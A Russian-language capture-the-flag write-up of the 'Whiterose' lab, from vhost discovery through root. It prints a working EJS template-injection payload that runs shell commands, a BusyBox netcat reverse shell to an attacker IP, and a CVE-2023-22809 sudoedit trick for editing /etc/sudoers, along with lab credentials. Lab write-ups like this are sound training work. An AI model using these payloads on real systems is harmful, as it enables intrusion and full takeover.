# Отчет по прохождению Whiterose

## 1. Разведка (Reconnaissance)

Первоначальное сканирование Nmap выявило открытые порты 80/tcp (nginx) и 22/tcp (SSH). При обращении по IP-адресу происходил редирект на домен `cyprusbank.thm`, который был добавлен в файл `/etc/hosts`. Фаззинг директорий с помощью gobuster не дал значимых результатов. Однако при переборе виртуальных хостов (vhosts) был обнаружен поддомен `admin.cyprusbank.thm` с редиректом на `/login`, который также был добавлен в `/etc/hosts`.

В задании были предоставлены начальные учетные данные: `Olivia Cortez:olivi8`, которые позволили успешно авторизоваться в панели управления.

## 2. Анализ веб-приложения

В процессе изучения функционала был найден эндпоинт `/messages/` с параметром `c`, изменение значения которого влияло на отображаемые сообщения. 
Дальнейший анализ страницы и переписки позволил обнаружить пароль другого пользователя:  
`Gayle Bev: p~]P@5!6;rs558:q`.

С этими учетными данными была успешно выполнена авторизация, что дало доступ к телефонным номерам. В рамках задания был найден номер `Tyrell Wellick: 842-029-5701`.

## 3. Поиск уязвимостей

Были проведены стандартные тесты параметра `name` на странице поиска (`/search?name=`) на наличие LFI и SQL-инъекций, однако результаты не подтвердили наличие этих уязвимостей.

В процессе тестирования страницы смены пароля было замечено, что при отправке запроса без указания пароля возвращается ошибка рендеринга шаблона EJS. В стеке ошибки была раскрыта информация об используемой версии EJS 3.1.9.

Это указывало на возможность **Server-Side Template Injection (SSTI)**.

## 4. Эксплуатация SSTI

Был составлен и отправлен payload для эксплуатации SSTI в EJS:

```
name=test&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('id');
```

Ответ сервера подтвердил выполнение команды:
```
uid=1001(web) gid=1001(web) groups=1001(web)
```

Далее был загружен reverse shell с использованием BusyBox:

```bash
busybox nc 192.168.187.139 4444 -e sh
```

После получения оболочки был прочитан пользовательский флаг в `/home/web/user.txt`.

## 5. Эскалация привилегий

Анализ привилегий с помощью `sudo -l` показал, что пользователь `web` может выполнять команду `sudoedit` для файла `/etc/nginx/sites-available/admin.cyprusbank.thm`.

Была применена уязвимость **CVE-2023-22809**, которая позволяет обойти ограничения `sudoedit` за счет передачи дополнительных аргументов через переменную `EDITOR`.  

Для эксплуатации была выполнена команда:

```bash
sudo EDITOR="vim -- /etc/sudoers" sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

В результате открылся файл `/etc/sudoers`, в который была добавлена строка:

```
web ALL=(ALL:ALL) NOPASSWD: ALL
```

После сохранения файла стало возможным выполнение команды `sudo su root` без ввода пароля. Таким образом были получены права root, и прочитан root-флаг.

## 6. Итог

В ходе выполнения задания были продемонстрированы навыки:
- разведки и анализа веб-приложений;
- эксплуатации SSTI в шаблонизаторе EJS;
- получения reverse shell через BusyBox;
- эскалации привилегий через уязвимость CVE-2023-22809 в `sudoedit`.
